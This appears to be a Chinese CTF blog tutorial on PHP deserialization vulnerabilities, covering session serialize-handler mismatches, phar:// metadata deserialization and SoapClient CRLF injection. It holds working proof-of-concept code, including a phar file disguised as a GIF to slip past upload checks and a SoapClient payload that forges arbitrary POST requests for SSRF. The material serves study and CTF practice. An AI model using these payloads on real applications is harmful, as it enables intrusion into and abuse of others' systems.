---
title: PHP常见反序列化漏洞
layout: categories
date: 2020-04-14
tags: [CTF, PHP]
categories:
- [CTF, PHP]
comments: false
---
# PHP常见反序列化漏洞

## Session反序列化漏洞

### Session序列化机制

Session是以序列化字符串的形式存储在文件中的,读取Session是一个反序列化的过程,那么就有可能出现反序列化漏洞

当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）

<!-- more -->

PHP处理器的三种序列化方式：

| 处理器        | 存储方式                                                     |
| :------------ | :----------------------------------------------------------- |
| php_binary    | 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 |
| php           | 键名＋竖线＋经过serialize()函数反序列处理的值                |
| php_serialize | serialize()函数反序列处理数组方式                            |

php.ini中含有几个与session存储配置相关的配置项：

```
session.save_path=""   --设置session的存储路径,默认在/tmp
session.auto_start   --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
session.serialize_handler   --定义用来序列化/反序列化的处理器名字。默认使用php
```

### 简要分析

当由于处理session的处理器不同时就可以触发反序列化漏洞

处理器是php时,是以|后为反序列化内容的,而用php_serialize存储的session如果没有过滤`|`字符就会导致php处理器将后面的内容反序列化,达到反序列化成对象的目的

## phar伪协议触发反序列化

### phar://协议

可以将多个文件归入一个本地文件夹，也可以包含一个文件

### phar文件

PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用`.phar`作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。

安装phar扩展然后在php.ini中设置phar.readonly=off或0才可以使用phar对象创建phar文件

### phar文件结构

[Phar官方文档](https://www.php.net/phar)

1、a stub
识别phar拓展的标识，格式:xxx。对应的函数Phar::setStub

2、a manifest describing the contents
被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata—设置phar归档元数据

3、 the file contents
被压缩文件的内容。

4、[optional] a signature for verifying Phar integrity (phar file format only)
签名，放在文件末尾。对应函数Phar :: stopBuffering —停止缓冲对Phar存档的写入请求，并将更改保存到磁盘

### Phar内置方法

```
$phar = new Phar('phar/hpdoger.phar'); //实例一个phar对象供后续操作
$phar->startBuffering()  //开始缓冲Phar写操作
$phar->addFromString('test.php','<?php echo 'this is test file';'); //以字符串的形式添加一个文件到 phar 档案
$phar->buildFromDirectory('fileTophar') //把一个目录下的文件归档到phar档案
$phar->extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容
```

### demo

```
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件

    $phar->stopBuffering();//签名自动计算
//创建phar文件
<?php 
    class TestObject {
        public function __destruct() {
            echo 'Destruct called';
        }
    }

    $filename = 'phar://phar.phar/test.txt';
    file_get_contents($filename); 
//利用页面
//输出
Destruct called
//所以达到了反序列化TestObject对象的目的
```

### 将phar伪造成其他格式的文件

php识别phar文件是通过其文件头的stub，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。

```
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
//生成的phar文件会被文件头检测为GIF
```

## 使用php内置类进行反序列化攻击

### PHP内置类

```
$classes = get_declared_classes();
foreach ($classes as $class) {
	$methods = get_class_methods($class);
	foreach ($methods as $method) {
		if (in_array($method, array(
			'__destruct',
			'__toString',
			'__wakeup',
			'__call',
			'__callStatic',
			'__get',
			'__set',
			'__isset',
			'__unset',
			'__invoke',
			'__set_state'
		))) {
			print $class . '::' . $method . "\n";
		}
	}
}
//输出结果为php中内置的类及方法
```

### SoapClient

#### `__call`方法

正常情况下的`SoapClient`类，调用一个不存在的函数，会去调用`__call`方法

```
<?php
$a = new SoapClient(null,array('uri'=>'bbb', 'location'=>'http://ip:port/path'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->not_exists_function();
```

在服务器或者虚拟机开启nc监听端口,就会收到SoapClient对象的http请求,携带着一段xml文本

[![mark](https://blogjpg.yanmy.top/blog/20200414/0YF4dgN2wFmy.png?imageslim)](https://blogjpg.yanmy.top/blog/20200414/0YF4dgN2wFmy.png?imageslim)

`SOAPAction`处可控，可以把`\x0d\x0a`注入到`SOAPAction`，POST请求的header就可以被控制

```
<?php
$a = new SoapClient(null,array('uri'=>"bbb\r\n\r\nccc\r\n", 'location'=>'http://ip:port/path'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->not_exists_function();
```

[![mark](https://blogjpg.yanmy.top/blog/20200414/iNrDeQpFDpm5.png?imageslim)](https://blogjpg.yanmy.top/blog/20200414/iNrDeQpFDpm5.png?imageslim)

但`Content-Type`在`SOAPAction`的上面，就无法控制`Content-Typ`,也就不能控制POST的数据

在header里`User-Agent`在`Content-Type`前面

`user_agent`同样可以注入`CRLF`，控制`Content-Type`的值

```
<?php
$target = 'http://127.0.0.1:5555/path';
$post_string = 'data=something';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=my_session'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo $aaa;

$c = unserialize($aaa);
$c->not_exists_function();
?>
```

[![mark](https://blogjpg.yanmy.top/blog/20200414/86vKwz3yLHJW.png?imageslim)](https://blogjpg.yanmy.top/blog/20200414/86vKwz3yLHJW.png?imageslim)

如上，使用SoapClient反序列化+CRLF**可以生成任意POST请求**。

**Deserialization + __call + SoapClient + CRLF = SSRF**

#### CTF题目

[n1ctf2018 easy_harder_php](https://link.zhihu.com/?target=https%3A//github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php)

[SUCTF-2019 Upload Labs 2](https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload Labs 2)

## Reference

[四个实例递进php反序列化漏洞理解](https://www.anquanke.com/post/id/159206#h2-10)

[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

[PHP反序列化入门之phar](https://mochazz.github.io/2019/02/02/PHP反序列化入门之phar/#例题二)